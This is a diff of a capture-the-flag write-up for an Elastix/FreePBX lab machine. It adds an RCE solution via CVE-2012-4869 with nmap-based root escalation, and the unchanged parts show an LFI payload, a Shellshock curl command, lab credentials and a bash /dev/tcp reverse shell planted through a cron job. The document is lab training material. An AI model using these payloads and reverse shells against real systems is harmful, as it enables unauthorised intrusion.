@@ -128,6 +128,35 @@ Finished
 
 ## Exploitation
 ### 1.Solution:
++ **FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution:** [CVE-2012-4869](https://www.exploit-db.com/exploits/18650)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bad4b1fb-ec37-4d3a-909a-793444ff8642)
+
++ Change ip addresses, port number and extension.
++ `svwar -m INVITE -e100-999 10.10.10.7`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4a817eae-9a98-40d4-a833-1d95881435ac)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/db740540-ac1d-4442-adda-8ce51836e191)
+
++ Start listener: `nc -lnvp 5555`
++ `python2 exploit.py`
++ Get shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5d0fc2c7-ae04-445e-8dd4-ff126f3ddf70)
+
++ Check the exploit: [CVE-2012-4869](https://www.exploit-db.com/exploits/18650)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d3c1ce37-ee67-4969-ac1b-e1317cc62c3b)
+
++ `sudo nmap --interactive`
++ `!sh`
++ Get root!
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7ba531b7-f20d-4a5d-9968-6ccfdecbb510)
+
+
+### 2.Solution:
 + **Elastix 2.2.0 - 'graph.php' Local File Inclusion:** [LFI](https://www.exploit-db.com/exploits/37637)
 + Exploit: `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
 + Navigate to:
@@ -164,7 +193,7 @@ view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4cf306f2-3f06-4311-ba44-3fba99817893)
 
-### 2.Solution:
+### 3.Solution:
 + Navigate to `https://10.10.10.7:10000/` and try login: `admin`:`admin`
 + Failed attempt redirects `https://10.10.10.7:10000/session_login.cgi`
 
@@ -182,7 +211,7 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27ac05b7-ad64-4ee1-9af6-012dc4b8b77a)
 
 
-### 3.Solution:
+### 4.Solution:
 + Navigate to `https://10.10.10.7:10000/` and login webmin: `root`:`jEhdIekWmdjE`
 + Go to `System`->`Scheduled Cron Jobs`->`Create a new scheduled cron job.`
 + `bash -c 'bash -i >& /dev/tcp/10.10.14.18/5555 0>&1'`
